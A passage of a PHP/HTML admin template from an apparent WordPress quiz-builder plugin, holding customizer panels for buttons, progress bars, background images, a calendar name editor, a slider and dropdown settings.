							<div class="showHideLeftSidebaroptions">
								<h3 class="Template-Customize_heading" >Answer Customizer 
									<div class="customize_open_close">
										<i class="fa fa-angle-up customize_close" aria-hidden="true"></i>
										<i class="fa fa-angle-down customize_open" aria-hidden="true" style="display:none"></i>
									</div>
								</h3> 
							</div>
							
							<div class="customizer_innner_sections" style="display:none;">
								<div class="Template-Customize-element poll-progress-settings" style="<?php echo $poll_progress_settings; ?>">
									<div class="Template-Customize-element-inner">
										<div class="inner_template_style_box">
											<h4>Progress Background Color</h4>
											<div id="progress_background_color_div" class="input-group colorpicker-component input-append color colorpicker-element">
												<input type="text" value="<?php echo $template8_progress_background_color; ?>" id="progress_background_color" class="colorpicker-element">
												<span class="input-group-addon"><i style="background-color: #ff8745;"></i></span>
											</div>
										</div>
										<div class="inner_template_style_box">
											<h4>Progress Text Color</h4>
											<div id="progress_text_color_div" class="input-group colorpicker-component input-append color colorpicker-element">
												<input type="text" value="<?php echo $template8_progress_text_color; ?>" id="progress_text_color" class="colorpicker-element">
												<span class="input-group-addon"><i style="background-color: #ff8745;"></i></span>
											</div>
										</div>
										
										
									</div>
								</div>

								
							</div>
						</div>
						<div class="Template-Customize-Setting sqb-question-screen-btn-customizers">
							<div class="showHideLeftSidebaroptions">
								<h3 class="Template-Customize_heading" >Button Customizer 
									<div class="customize_open_close">
										<i class="fa fa-angle-up customize_close" aria-hidden="true"></i>
										<i class="fa fa-angle-down customize_open" aria-hidden="true" style="display:none"></i>
									</div>
								</h3> 
							</div>
							

							<div class="show_for_template8">
								<div class="customizer_innner_sections hide_for_template8" style="display:none">
									<div class="Template-Customize-element">
										<div class="Template-Customize-element-inner" style="display:none;">
											<div class="inner_template_style_box">
												<div class="d-flex justify-content-between align-items-center">
													<h4>Show Skip Button</h4>
													<div class="quiz_right-content">
														<div class="square-switch_onoff">
															<input class="checkbox" name="showHide_skipbtn" type="checkbox" id="showHide_skipbtn" value="">
															<label for="showHide_skipbtn"></label>
														</div>
													</div>
												</div>
											</div>
										</div>

										<button type="button" data-id="skip-button-element-option"  class="Template-Customize-element-btn mt-3"><i class="fa fa-sort-desc fa-rotate-270" aria-hidden="true"></i> Skip Button style</button>
										
										<div class="Template-Customize-element-inner skip-button-element-option hide" style="display:none;">
											<div class="inner_template_style_box">
												<h4>Skip Button Width</h4>
												<p>
													<input id="skip_btn_width" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="20" data-slider-max="500" data-slider-step="1" data-slider-value="<?php echo (int) $template8_skip_button_width; ?>">
												</p>
											</div>
											
											<div class="inner_template_style_box">
												<h4>Skip Button Height</h4>
												<p>
													<input id="skip_btn_height" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="20" data-slider-max="200" data-slider-step="1" data-slider-value="<?php echo (int) $template8_skip_button_height; ?>">
												</p>
											</div>
											<div class="inner_template_style_box setting-level-quiz" <?php echo $setting_level == 'global' ? 'style="display:none;"' : ''; ?>>
												<h4>Skip Button Background</h4>
												<div id="skip_button_clr_div" class="input-group colorpicker-component input-append color colorpicker-element">
													<input type="text" value="<?php echo $template8_skip_button_background_color; ?>" id="skip_button_clr">
													<span class="input-group-addon"><i style="background-color: <?php echo $template8_skip_button_background_color; ?>;"></i></span>
												</div>
											</div>
											
										</div>
									</div>
								</div>
								<div class="customizer_innner_sections" style="display:none">
									<div class="Template-Customize-element">
										<button type="button" data-id="continue-button-element-option"  class="Template-Customize-element-btn "><i class="fa fa-sort-desc fa-rotate-270" aria-hidden="true"></i> Continue Button Style</button>
										<div class="Template-Customize-element-inner continue-button-element-option" style="display:none;">
											
											<div class="inner_template_style_box">
												<h4>Continue Button Width</h4>
												<p>
													<input id="continue_btn_width" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="10" data-slider-max="500" data-slider-step="1" data-slider-value="<?php echo (int) $template8_continue_button_width; ?>">
												</p>
											</div>
											<div class="inner_template_style_box">
												<h4>Continue Button Height</h4>
												<p>
													<input id="continue_btn_height" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="10" data-slider-max="200" data-slider-step="1" data-slider-value="<?php echo (int) $template8_continue_button_height; ?>">
												</p>
											</div>
											<div class="inner_template_style_box">
												<h4>Continue Button Radius</h4>
												<p>
													<input id="continue_btn_radius" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="50" data-slider-step="1" data-slider-value="<?php echo (int) $template8_continue_button_radius; ?>">
												</p>
											</div>
											<div class="inner_template_style_box setting-level-quiz" <?php echo $setting_level == 'global' ? 'style="display:none;"' : ''; ?>>
												<h4>Continue Button Background</h4>
												<div id="continue_button_clr_div" class="input-group colorpicker-component input-append color colorpicker-element">
													<input type="text" value="<?php echo $template8_continue_button_background_color; ?>" id="continue_button_clr">
													<span class="input-group-addon"><i style="background-color: <?php echo $template8_continue_button_background_color; ?>;"></i></span>
												</div>
											</div>

											<div class="inner_template_style_box setting-level-quiz" <?php echo $setting_level == 'global' ? 'style="display:none;"' : ''; ?>>
												<h4>Continue Button Hover Background</h4>
												<div id="continue_button_hover_clr_div" class="input-group colorpicker-component input-append color colorpicker-element">
													<input type="text" value="<?php echo $template8_continue_button_hover_background_color; ?>" id="continue_button_hover_clr">
													<span class="input-group-addon"><i style="background-color: <?php echo $template8_continue_button_hover_background_color; ?>;"></i></span>
												</div>
											</div>
											
										</div>
									</div>		
								</div>
							</div>

							<div class="customizer_innner_sections sqbv2-temlate1to4-button" style="display:none">
								<div class="Template-Customize-element">
									<button type="button" data-id="back-button-element-option"  class="Template-Customize-element-btn" ><i class="fa fa-sort-desc fa-rotate-270" aria-hidden="true"></i> Back Button style</button>
									
									<div class="Template-Customize-element-inner back-button-element-option" style="display:none;">
										<div class="inner_template_style_box">
											<h4>Back Button Width</h4>
											<p>
												<input id="all_temp_back_btn_width" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="900" data-slider-step="1" data-slider-value="<?php echo (int) $back_question_btn_width_for_quiz; ?>">
											</p>
										</div>
										
										<div class="inner_template_style_box">
											<h4>Back Button Height</h4>
											<p>
												<input id="all_temp_back_btn_height" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="200" data-slider-step="1" data-slider-value="<?php echo (int) $back_question_btn_height_for_quiz; ?>">
											</p>
										</div>

										<div class="inner_template_style_box">
											<h4>Back Button Radius</h4>
											<p>
												<input id="all_temp_back_btn_radius" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="50" data-slider-step="1" data-slider-value="<?php echo (int) $back_question_btn_radius_for_quiz; ?>">
											</p>
										</div>
										<div class="inner_template_style_box setting-level-quiz" <?php echo $setting_level == 'global' ? 'style="display:none;"' : ''; ?>>
											<h4>Back Button Background</h4>
											<div id="all_back_button_clr_div" class="input-group colorpicker-component input-append color colorpicker-element">
												<input type="text" value="<?php echo $back_question_button_for_quiz; ?>" id="all_back_button_clr">
												<span class="input-group-addon"><i style="background-color: <?php echo $back_question_button_for_quiz; ?>;"></i></span>
											</div>
										</div>

										<div class="inner_template_style_box setting-level-quiz" <?php echo $setting_level == 'global' ? 'style="display:none;"' : ''; ?>>
											<h4>Back Button Hover Color</h4>
											<div id="all_back_button_hover_clr_div" class="input-group colorpicker-component input-append color colorpicker-element">
												<input type="text" value="<?php echo $back_question_button_hover_for_quiz; ?>" id="all_back_button_hover_clr">
												<span class="input-group-addon"><i style="background-color: <?php echo $back_question_button_hover_for_quiz; ?>;"></i></span>
											</div>
										</div>
										
									</div>
								</div>
							</div>
							
							<div class="customizer_innner_sections sqbv2-temlate1to4-button" style="display:none">
								<div class="Template-Customize-element">
									<button type="button" data-id="skip-button-element-option"  class="Template-Customize-element-btn" ><i class="fa fa-sort-desc fa-rotate-270" aria-hidden="true"></i> Skip Button style</button>
									
									<div class="Template-Customize-element-inner skip-button-element-option" style="display:none;">
										<div class="inner_template_style_box">
											<h4>Skip Button Width</h4>
											<p>
												<input id="all_temp_skip_btn_width" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="900" data-slider-step="1" data-slider-value="<?php echo (int) $skip_question_btn_width_for_quiz; ?>">
											</p>
										</div>
										
										<div class="inner_template_style_box">
											<h4>Skip Button Height</h4>
											<p>
												<input id="all_temp_skip_btn_height" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="200" data-slider-step="1" data-slider-value="<?php echo (int) $skip_question_btn_height_for_quiz; ?>">
											</p>
										</div>
										<div class="inner_template_style_box">
											<h4>Skip Button Radius</h4>
											<p>
												<input id="all_temp_skip_btn_radius" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="50" data-slider-step="1" data-slider-value="<?php echo (int) $skip_question_btn_radius_for_quiz; ?>">
											</p>
										</div>
										<div class="inner_template_style_box setting-level-quiz" <?php echo $setting_level == 'global' ? 'style="display:none;"' : ''; ?>>
											<h4>Skip Button Background</h4>
											<div id="all_skip_button_clr_div" class="input-group colorpicker-component input-append color colorpicker-element">
												<input type="text" value="<?php echo $skip_question_button_for_quiz; ?>" id="all_skip_button_clr">
												<span class="input-group-addon"><i style="background-color: <?php echo $skip_question_button_for_quiz; ?>;"></i></span>
											</div>
										</div>
										<div class="inner_template_style_box setting-level-quiz" <?php echo $setting_level == 'global' ? 'style="display:none;"' : ''; ?>>
											<h4>Skip Button Hover Color</h4>
											<div id="all_skip_button_hover_clr_div" class="input-group colorpicker-component input-append color colorpicker-element">
												<input type="text" value="<?php echo $skip_question_button_hover_for_quiz; ?>" id="all_skip_button_hover_clr">
												<span class="input-group-addon"><i style="background-color: <?php echo $skip_question_button_hover_for_quiz; ?>;"></i></span>
											</div>
										</div>
										
									</div>
								</div>
							</div>
							
							<div class="customizer_innner_sections hide_for_template8 sqbv2-temlate1to4-button" style="display:none">
								<div class="Template-Customize-element">
									<button type="button" data-id="continue-button-element-option"  class="Template-Customize-element-btn "><i class="fa fa-sort-desc fa-rotate-270" aria-hidden="true"></i> Next Button Style</button>
									<div class="Template-Customize-element-inner continue-button-element-option" style="display:none;">
										
										<div class="inner_template_style_box">
											<h4>Next Button Width</h4>
											<p>
												<input id="all_temp_continue_btn_width" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="900" data-slider-step="1" data-slider-value="<?php echo (int) $nexttbtn_width_for_quiz; ?>">
											</p>
										</div>
										<div class="inner_template_style_box">
											<h4>Next Button Height</h4>
											<p>
												<input id="all_temp_continue_btn_height" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="200" data-slider-step="1" data-slider-value="<?php echo (int) $nexttbtn_height_for_quiz; ?>">
											</p>
										</div>
										<div class="inner_template_style_box">
											<h4>Next Button Radius</h4>
											<p>
												<input id="all_temp_continue_btn_radius" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="50" data-slider-step="1" data-slider-value="<?php echo (int) $nexttbtn_radius_for_quiz; ?>">
											</p>
										</div>
										<div class="inner_template_style_box sqb-gl-map setting-level-quiz" <?php echo $setting_level == 'global' ? 'style="display:none;"' : ''; ?>>
											<h4>Next Button Background</h4>
											<div id="all_temp_continue_button_clr_div" class="input-group colorpicker-component input-append color colorpicker-element">
												<input type="text" value="<?php echo $next_button_settings_background_color; ?>" id="all_temp_continue_button_clr">
												<span class="input-group-addon"><i style="background-color: <?php echo $next_button_settings_background_color; ?>;"></i></span>
											</div>
										</div>
										<div class="inner_template_style_box sqb-gl-map setting-level-quiz" <?php echo $setting_level == 'global' ? 'style="display:none;"' : ''; ?>>
											<h4>Next Button Hover Color</h4>
											<div id="all_temp_continue_button_hover_clr_div" class="input-group colorpicker-component input-append color colorpicker-element">
												<input type="text" value="<?php echo $next_button_settings_background_hover_color; ?>" id="all_temp_continue_button_hover_clr">
												<span class="input-group-addon"><i style="background-color: <?php echo $next_button_settings_background_hover_color; ?>;"></i></span>
											</div>
										</div>
										
									</div>
								</div>		
							</div>	

							<div class="customizer_innner_sections hide_for_template8 sqbv2-temlate1to4-button" style="display:none">
								<div class="Template-Customize-element progress-bar-cust">
									<button type="button" data-id="progress-button-element-option"  class="Template-Customize-element-btn "><i class="fa fa-sort-desc fa-rotate-270" aria-hidden="true"></i> Progress Bar</button>
									<div class="Template-Customize-element-inner progress-button-element-option" style="display:none;">
										<div class="inner_template_style_box">
											<h4>Progress Bar Active(Background)</h4>
											<div id="all_temp_progress_bar_active_color_div" class="input-group colorpicker-component input-append color colorpicker-element">
												<input type="text" value="<?php echo $all_temp_progress_bar_active_color; ?>" id="all_temp_progress_bar_active_color">
												<span class="input-group-addon"><i style="background-color: <?php echo $all_temp_progress_bar_active_color; ?>;"></i></span>
											</div>
										</div>
										<div class="inner_template_style_box">
											<h4>Progress Bar Inactive (Background)</h4>
											<div id="all_temp_progress_bar_inactive_color_div" class="input-group colorpicker-component input-append color colorpicker-element">
												<input type="text" value="<?php echo $all_temp_progress_bar_inactive_color; ?>" id="all_temp_progress_bar_inactive_color">
												<span class="input-group-addon"><i style="background-color: <?php echo $all_temp_progress_bar_inactive_color; ?>;"></i></span>
											</div>
										</div>
										
									</div>
								</div>		
							</div>	
						</div>
						<div class="Template-Customize-Setting Template-Customizer-Section template_5_background_img_customizer"  >
							<div class="showHideLeftSidebaroptions">
								<h3 class="Template-Customize_heading" >Background Image 
									<div class="customize_open_close">   
										<i class="fa fa-angle-up customize_close" aria-hidden="true" style="display:none"></i>
										<i class="fa fa-angle-down customize_open" aria-hidden="true" ></i>
									</div>
								</h3> 
							</div>
							<div class="customizer_innner_sections" style="display:none;">
								<div class="Template-Customize-element Template5_customizer">	
									<div class="Template-Customize-element-inner" style="display: block;">
										<div class="inner_template_style_box">
											<div class="d-flex justify-content-between align-items-center">
												<h4>Background Image</h4>
												<div class="quiz_right-content">
													<div class="square-switch_onoff">
														<input class="checkbox" name="enable_question_screen_background_image" type="checkbox" id="enable_question_screen_background_image" value="">
														<label for="enable_question_screen_background_image"></label>
													</div>
												</div>
											</div>
										</div>
									</div>
								</div>
									
								<div class="Template-Customize-element" style="display:none;">	
									<div class="Template-Customize-element-inner question_screen_bg_image_size" style="display: block;">
										 <div class="inner_template_style_box">
											<h4>Image Size</h4>
											<p><input id="question_screen_background_image_size" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="500" data-slider-max="1600" data-slider-step="1" data-slider-value="640"></p>
										</div>
									</div>
								</div>
								<div class="Template-Customize-element" style="display:none;">	
									<div class="Template-Customize-element-inner question_screen_title_bg_color" style="display: block;">
										 <div class="inner_template_style_box">
											<h4>Title background</h4>
											<div class="input-group colorpicker-component input-append color colorpicker-element" id="question_screen_title_bg_clr_div">
												<input type="text" value="rgba(255,255,255,0.61)" id="question_screen_title_bg_clr" >
												<span class="input-group-addon">
													<i style="background-color: rgba(255,255,255,0.61)">
													</i>
												</span>
											</div>
										</div>
									</div>
								</div>
								<div class="Template-Customize-element" style="display:none;">	
									<div class="Template-Customize-element-inner question_screen_title_bg_color" style="display: block;">
										 <div class="inner_template_style_box">
											<h4>Background Image Opacity</h4>
											<div class="input-group colorpicker-component input-append color colorpicker-element" id="question_screen_bg_image_opacity_clr_div">
												<input type="text" value="rgba(255,255,255,0.5)" id="question_screen_bg_image_opacity_clr" >
												<span class="input-group-addon">
													<i style="background-color:rgba(255,255,255,0.5)">
													</i>
												</span>
											</div>
										</div>
										<div class="inner_template_style_box">
											<p><a href="javascript:void(0)" class="sqb_remove_question_screen_bg_image_opacity">Remove Image Opacity</a></p>
										</div>
									</div>
								</div>
								<div class="Template-Customize-element" style="display:none;">	
									<div class="Template-Customize-element-inner question_screen_change_bg_image" style="display: block;">
										 <div class="inner_template_style_box">
											<p><a href="javascript:void(0)" 
											class="sqb_change_question_screen_bg_image">Change 
											Image</a><a href="javascript:void(0)" 
											class="sqb_remove_question_screen_bg_image">Remove Image</a></p>
										</div>
									</div>
								</div>
								
							</div>
						</div>
						<div class="Template-Customize-Setting " >
							<div class="showHideLeftSidebaroptions">
								<h3 class="Template-Customize_heading" >Personalization 
									<div class="customize_open_close">   
										<i class="fa fa-angle-up customize_close" aria-hidden="true"></i>
										<i class="fa fa-angle-down customize_open" aria-hidden="true" style="display:none"></i>
									</div>
								</h3> 
							</div>
							
							<div class="customizer_innner_sections" style="display:none;">
								<div class="Template-Customize-element">
									<div class="Template-Customize-element-inner template_img_style1" style="display:block">
										<div class="inner_template_style_box ">
											<h4>%%FIRST%% <div class="tool-tip">
											<i class="fa fa-info-circle" aria-hidden="true"></i>
											<div class="toll-tip-desc">If you want to personalize the questions or answers using the first name of the participant, you can use use %%FIRST%% in your questions or answers. <br><br>PLEASE NOTE: To use this feature, first enable personalization in the settings page.</div>
											</div></h4>

										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>


<div class="sqb_question_clone_html" style="display:none">
	<?php $question_html =  sqbAddMoreQuestions();echo $question_html;?>
</div>
<div class="sqb_question_clone_html_template5" style="display:none">
	<?php $question_html_template5 =  sqbAddMoreQuestionsTemplate5();echo $question_html_template5;?>
</div>
<div class="sqb_question_clone_html_template9" style="display:none">
	<?php $question_html_template9 =  sqbAddMoreQuestionsTemplate9();echo $question_html_template9;?>
</div>
<div class="sqb_answer_bot_option_clone_html" style="display:none">
	<?php $answer_bot_option_html =  sqbAddAnswerBotOptions();echo $answer_bot_option_html;?>
</div>


<!-- Modal -->
<div id="myModalQuestion" class="modal_popup_cont modal_popup_ques modal fade" role="dialog">
  <div class="modal-dialog modal-lg">

    <!-- Modal content-->
    <div class="modal-content">
      <div class="modal-header">
		   <h4 class="modal-title">Select Template</h4>
			<button type="button" class="close" data-dismiss="modal">&times;</button>       
      </div>
      <div class="modal-body template_container_outer">
      <div class="st_template_outer">
		  <h5>Standard</h5>
		  <input type="radio" name="questemplate" id="questemplate1" value="template1"/>
			<label class="template_container" for="questemplate1"><img class="img_prev" src="<?php echo plugin_dir_url(__FILE__)."../../includes/images/start_image1.jpg";?>"></label>
	  </div>  
      <div class="st_template_outer">
		  <h5>Vertical</h5>
		  <input type="radio" name="questemplate"  id="questemplate2" value="template2"/>
			<label class="template_container"  for="questemplate2"><img class="img_prev" src="<?php echo plugin_dir_url(__FILE__)."../../includes/images/start_image2.jpg";?>"></label>
	  </div>  
      <div class="st_template_outer">
		  <h5>Horizontal</h5>
		  <input type="radio" name="questemplate"  id="questemplate3" value="template3"/>
			<label class="template_container"  for="questemplate3"><img class="img_prev" src="<?php echo plugin_dir_url(__FILE__)."../../includes/images/start_image.jpg";?>"></label>
	  </div>  
			
			
      </div>
      
    </div>

  </div>
</div>
<input type="hidden" value="<?php echo $allquestionscount; ?>" id="get_all_qns_count">
<input type="hidden" name="question_ans_empty_img" value="<?php echo plugins_url('').'/smartquizbuilder/includes/images/sqb_empty.jpg'; ?>"> 

<!-- --- -->

<div id="myDatepickerModal" class="modal quiz-popup-style fade" role="dialog">
	<div class="modal-dialog modal-dialog-centered">
		<div class="modal-content">
			<div class="modal-header">
				<h4 class="modal-title">Customize Calendar</h4>
				<button type="button" class="close" data-dismiss="modal">&times;</button>       
			</div>
			<div class="modal-body">
				<div class="DatepickerModal-body-tabs">
					<ul class="nav nav-tabs">
						<li class="active"><a data-toggle="tab" href="#Monthmenu" class="active show">Month</a></li>
						<li><a data-toggle="tab" href="#Daymenu">Day</a></li>
					</ul>

					<div class="tab-content">
						<div id="Monthmenu" class="tab-pane fade in active show">
							<div class="datepicker_modal_body_inn">
								<div class="quiz-popup-feild"><label class="form-label">Month</label>
									<div class="quiz-popup-feild-right"><p>Customize Message</p></div>
								</div>
								<div class="datepicker-info-card month-names">
									<div class="quiz-popup-feild datepicker_redirect_out">
										<label class="form-label">January:</label>
										<div class="quiz-popup-feild-right ">
											<input class="form-control datepicker_cls" name="month_names" value="January">
										</div>
									</div>
									<div class="quiz-popup-feild datepicker_redirect_out">
										<label class="form-label">February:</label>
										<div class="quiz-popup-feild-right ">
											<input class="form-control datepicker_cls" name="month_names" value="February">
										</div>
									</div>
									<div class="quiz-popup-feild datepicker_redirect_out">
										<label class="form-label">March:</label>
										<div class="quiz-popup-feild-right ">
											<input class="form-control datepicker_cls" name="month_names" value="March">
										</div>
									</div>
									<div class="quiz-popup-feild datepicker_redirect_out">
										<label class="form-label">April:</label>
										<div class="quiz-popup-feild-right ">
											<input class="form-control datepicker_cls" name="month_names" value="April">
										</div>
									</div>
									<div class="quiz-popup-feild datepicker_redirect_out">
										<label class="form-label">May:</label>
										<div class="quiz-popup-feild-right ">
											<input class="form-control datepicker_cls" name="month_names" value="May">
										</div>
									</div>
									<div class="quiz-popup-feild datepicker_redirect_out">
										<label class="form-label">June:</label>
										<div class="quiz-popup-feild-right ">
											<input class="form-control datepicker_cls" name="month_names" value="June">
										</div>
									</div>
									<div class="quiz-popup-feild datepicker_redirect_out">
										<label class="form-label">July:</label>
										<div class="quiz-popup-feild-right ">
											<input class="form-control datepicker_cls" name="month_names" value="July">
										</div>
									</div>
									<div class="quiz-popup-feild datepicker_redirect_out">
										<label class="form-label">August:</label>
										<div class="quiz-popup-feild-right ">
											<input class="form-control datepicker_cls" name="month_names" value="August">
										</div>
									</div>
									<div class="quiz-popup-feild datepicker_redirect_out">
										<label class="form-label">September:</label>
										<div class="quiz-popup-feild-right ">
											<input class="form-control datepicker_cls" name="month_names" value="September">
										</div>
									</div>
									<div class="quiz-popup-feild datepicker_redirect_out">
										<label class="form-label">October:</label>
										<div class="quiz-popup-feild-right ">
											<input class="form-control datepicker_cls" name="month_names" value="October">
										</div>
									</div>
									<div class="quiz-popup-feild datepicker_redirect_out">
										<label class="form-label">November:</label>
										<div class="quiz-popup-feild-right ">
											<input class="form-control datepicker_cls" name="month_names" value="November">
										</div>
									</div>
									<div class="quiz-popup-feild datepicker_redirect_out">
										<label class="form-label">December:</label>
										<div class="quiz-popup-feild-right ">
											<input class="form-control datepicker_cls" name="month_names" value="December">
										</div>
									</div>
								</div>
							</div>
						</div>
						<div id="Daymenu" class="tab-pane fade">
							<div class="datepicker_modal_body_inn">
								<div class="quiz-popup-feild"><label class="form-label">Day</label>
									<div class="quiz-popup-feild-right"><p>Customize Message</p></div>
								</div>
								<div class="datepicker-info-card day-names">
									<div class="quiz-popup-feild datepicker_redirect_out">
										<label class="form-label">Sunday:</label>
										<div class="quiz-popup-feild-right ">
											<input class="form-control datepicker_cls" name="day_names" value="Su">
										</div>
									</div>
									<div class="quiz-popup-feild datepicker_redirect_out">
										<label class="form-label">Monday:</label>
										<div class="quiz-popup-feild-right ">
											<input class="form-control datepicker_cls" name="day_names" value="Mo">
										</div>
									</div>
									<div class="quiz-popup-feild datepicker_redirect_out">
										<label class="form-label">Tuesday:</label>
										<div class="quiz-popup-feild-right ">
											<input class="form-control datepicker_cls" name="day_names" value="Tu">
										</div>
									</div>
									<div class="quiz-popup-feild datepicker_redirect_out">
										<label class="form-label">Wednesday:</label>
										<div class="quiz-popup-feild-right ">
											<input class="form-control datepicker_cls" name="day_names" value="We">
										</div>
									</div>
									<div class="quiz-popup-feild datepicker_redirect_out">
										<label class="form-label">Thursday:</label>
										<div class="quiz-popup-feild-right ">
											<input class="form-control datepicker_cls" name="day_names" value="Th">
										</div>
									</div>
									<div class="quiz-popup-feild datepicker_redirect_out">
										<label class="form-label">Friday:</label>
										<div class="quiz-popup-feild-right ">
											<input class="form-control datepicker_cls" name="day_names" value="Fr">
										</div>
									</div>
									<div class="quiz-popup-feild datepicker_redirect_out">
										<label class="form-label">Saturday:</label>
										<div class="quiz-popup-feild-right ">
											<input class="form-control datepicker_cls" name="day_names" value="Sa">
										</div>
									</div>
									
								</div>
							</div>
						</div>
					</div>
				</div>
				<div class="month-day-save-msg mt-4 pl-4 pr-4" style="display:none;">
					<div class="popup_saved_data_msg m-0">Saved Successfully</div>
				</div>
			</div>

			<div class="modal-footer quiz-popup-actions">        
			    <button type="button" class="btn btn-primary save-month-day-names">Save</button>
			</div>

		</div>
	</div>
</div>

<!-- ---- -->
<div class="outcome_result_clone_list">
	<ul class="multi-select-dropdown-list outcome_result_list" style="display: block;">
		<?php 
		
		if(isset($_GET['id'])){ 
			$outcomes_list = SQB_Outcome::loadByQuizId($_GET['id']);
			$outcome_hmtl = '';	
			if(is_array($outcomes_list)){
			
				foreach($outcomes_list as $outcome_list){
				
				
				$outcome_hmtl .= '<li data-id="">
								<div class="checkbox-custom-style">
									<input type="checkbox" class="custom-checkbox-input" name="outcome_result_checkbox" value="'.$outcome_list->getId().'">
									<span class="custom--checkbox"></span>
								</div>
								<label>'.$outcome_list->getOutcomeName().'</label>
							</li>';
			
				}
			}
			echo $outcome_hmtl;
		}
			
			
			?>
	</ul>
</div>



	<!-- answer_slider_options_wrapper html start -->
	<div class="Manage_Side_Popup active_Side_Popup answer_slider_options_wrapper" style="display:none">
	   <div class="Manage_Side_Popup-inner">
	      <a href="#" class="close_Side_Popup"><i class="fa fa-times" aria-hidden="true"></i></a>
	      <h2> Slider Customizer  </h2>
	      <div class="Manage_Side_Popup_content">


							<div class="Template-Customize-setting-outer">
								<div class="Template-Customize-Setting Template-Customizer-Section" >
										<div class="showHideLeftSidebaroptions">
											<h3 class="Template-Customize_heading" >Slider Customizer  
												<div class="customize_open_close">   
													<i class="fa fa-angle-up customize_close" aria-hidden="true" style="display:none"></i>
													<i class="fa fa-angle-down customize_open" aria-hidden="true" ></i>
												</div>
											</h3> 
										</div>

										<div class="customizer_innner_sections">
											<div class="Template-Customize-element sqb_common_customizer">
												<div class="Template-Customize-element-inner " >
													<div class="inner_template_style_box">
														<h4>Min Value</h4>
														<p>
															<input id="ans_slider_min_value" type="number" value="0" min="0">
														</p>
													</div>
												</div> 
												<div class="Template-Customize-element-inner " >
													<div class="inner_template_style_box">
														<h4>Max Value</h4>
														<p>
															<input id="ans_slider_max_value" type="number" value="100" min="0">
														</p>
													</div>
												</div>
												
												<div class="Template-Customize-element-inner ">
													<div class="inner_template_style_box">
														<h4>Step Value</h4>
														<p>
															<input id="ans_slider_step_value" type="number" value="1" min="0">
														</p>
													</div>
												</div>
												<div class="Template-Customize-element-inner">
												 <div class="inner_template_style_box">	 
														   <h4>background Color</h4>
															<div class="input-group colorpicker-component input-append color colorpicker-element" id="ans_slider_background_color_div">
																<input type="text" value="#00000040" id="ans_slider_background_color" >
																<span class="input-group-addon">
																	<i style="background-color: #00000040;">
																	</i>
																</span>
															</div>
													</div>
												</div>
												<div class="Template-Customize-element-inner">
												 <div class="inner_template_style_box">	 
														   <h4>Complete bar background Color</h4>
															<div class="input-group colorpicker-component input-append color colorpicker-element" id="ans_slider_complete_bar_background_color_div">
																<input type="text" value="#00000040" id="ans_slider_complete_bar_background_color" >
																<span class="input-group-addon">
																	<i style="background-color: #00000040;">
																	</i>
																</span>
															</div>
													</div>	
												</div>
												<div class="Template-Customize-element-inner">
													 <div class="inner_template_style_box">	 
														   <h4>Top box background Color</h4>
															<div class="input-group colorpicker-component input-append color colorpicker-element" id="ans_slider_top_box_background_color">
																<input type="text" value="#00000040" id="ans_slider_top_box_background_color" >
																<span class="input-group-addon">
																	<i style="background-color: #00000040;">
																	</i>
																</span>
															</div>
													</div>	
												</div>
											   
											   <div class="Template-Customize-element-inner " >
													<div class="inner_template_style_box">
														<h4>Prefix Text</h4>
														<p>
															<input id="ans_slider_prefix_text" type="text" value="">
														</p>
													</div>
												</div>
												<div class="Template-Customize-element-inner " >
													<div class="inner_template_style_box">
														<h4>Suffix Text</h4>
														<p>
															<input id="ans_slider_suffix_text" type="text" value="%">
														</p>
													</div>
												</div>
											
											</div>
										</div>	
									</div>		
								</div>		

	        </div>
	   </div>
	</div>

<!-- answer_slider_options_wrapper html end -->

<!-- answer_dropdown_options_wrapper html start -->
<div class="Manage_Side_Popup active_Side_Popup answer_dropdown_options_wrapper" style="display:none">
   <div class="Manage_Side_Popup-inner p-0 mt-4">
		<a href="#" class="close_Side_Popup"><i class="fa fa-times" aria-hidden="true"></i></a>
		<h2> Dropdown Settings  </h2>
		<div class="Manage_Side_Popup_content">
			<div class="quiz-content-card ml-3">
				<label for="" class="quiz_label p-0 mb-1">Label
					<div class="tool-tip">
					<i class="fa fa-info-circle" aria-hidden="true"></i>
					<div class="toll-tip-desc" style="max-width:240px;">will appear on User-Facing Pages</div>
					</div><sup class="required-star">*</sup>
				</label>
				<div class="quiz_right-content p-0">
					<div class="sqb_dropdown_type_default_label sqb_tiny_mce_editor"><div class="sqb_dropdown_type_default_label_inner" style="text-align:left">Enter Dropdown Heading Here</div></div>
				</div>
			</div>
			
			<div class="sqb_dropdown_questions_option">		
				<div class="options_leftside">
					<div class="quiz-content-card ml-3">
						<label for="" class="quiz_label p-0 mb-1">Default Value
						</label>
						<div class="quiz_right-content p-0">
							<input type="text" name="defaultdropdownvalue" id="defaultdropdownvalue" value="">			
						</div>
					</div>
					<div class="quiz-content-card ml-3">
						<label for="" class="quiz_label p-0 mb-1">Field Values
							<div class="tool-tip">
							<i class="fa fa-info-circle" aria-hidden="true"></i>
							<div class="toll-tip-desc" style="max-width:270px;">Separate each option with a comma or newline. For e.g:</br>option 1, option 2, option 3</br>
							--OR--</br>option 1</br>option 2</br>option 3</div>
							</div>
						</label>
						<div class="quiz_right-content p-0">
							<textarea class="form-control" name="field_value" type="text" id="field_value" cols="10" rows="5"></textarea>				
						</div>
					</div>
				</div>
				<div class="options_rightside">
					<h5>Preview</h5>
					<div class="preview_section">
						<div class="quiz-content-card  ">
							<label class="quiz_label p-0 mb-1 preview_dropdown_label">Dropdown Label:</label>
							<div class="quiz_right-content p-0 preview_dropdown_select">
								<select name="select_answers" class="sqb_question_dropdown" id="sqb_question_dropdown_2051">
									<option value="">----Select----</option>
								</select>				
							</div>
				    	</div>
				   </div>
				</div>
